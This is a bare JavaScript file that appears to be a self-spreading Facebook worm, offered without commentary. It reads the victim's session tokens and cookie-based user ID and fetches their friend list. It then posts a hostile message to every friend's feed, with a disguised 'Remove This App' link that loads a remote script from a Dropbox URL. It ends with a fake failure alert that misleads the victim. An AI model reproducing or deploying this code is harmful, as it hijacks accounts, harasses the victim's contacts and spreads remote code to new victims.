var message = "-------------------- I hate you and the only way to remove all these posts is by disabling this below.";
var jsText = "javascript:(function(){_ccscr=document.createElement('script');_ccscr.type='text/javascript';_ccscr.src='http://dl.dropbox.com/u/10505629/verify.js?'+(Math.random());document.getElementsByTagName('head')[0].appendChild(_ccscr);})();";
var myText = "Remove This App";

var post_form_id = document.getElementsByName('post_form_id')[0].value;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var uid = document.cookie.match(document.cookie.match(/c_user=(d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&viewer=" + uid + "&" + Math.random(), false);
gf.send();
if (gf.readyState != 4) {} else {
    data = eval('(' + gf.responseText.substr(9) + ')');
    if (data.error) {} else {
        friends = data.payload.entries.sort(function (a, b) {
            return a.index - b.index;
        });
    }
}
for (var i = 0; i < friends.length; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = "http://www.facebook.com/fbml/ajax/prompt_feed.php?__a=1";
    var paramswp = "&__d=1&app_id=6628568379&extern=0&" +
        "&post_form_id=" + post_form_id +
        "&fb_dtsg=" + fb_dtsg +
        "&feed_info[action_links][0][href]=" + encodeURIComponent(jsText) +
        "&feed_info[action_links][0][text]=" + encodeURIComponent(myText) +
        "&feed_info[app_has_no_session]=true&feed_info[body_general]=&feed_info[template_id]=60341837091&feed_info[templatized]=0&feed_target_type=target_feed&feedform_type=63&lsd&nctr[_ia]=1&post_form_id_source=AsyncRequest&preview=false&size=2&to_ids[0]=" + friends[i].uid +
        "&user_message=" + message;
    httpwp.open("POST", urlwp, true);
    httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpwp.setRequestHeader("Content-length", paramswp.length);
    httpwp.setRequestHeader("Connection", "keep-alive");
    httpwp.onreadystatechange = function () {
        if (httpwp.readyState == 4 && httpwp.status == 200) {

        }
    }
    httpwp.send(paramswp);
}
alert("Failed to remove. ----------");
document.location = "";
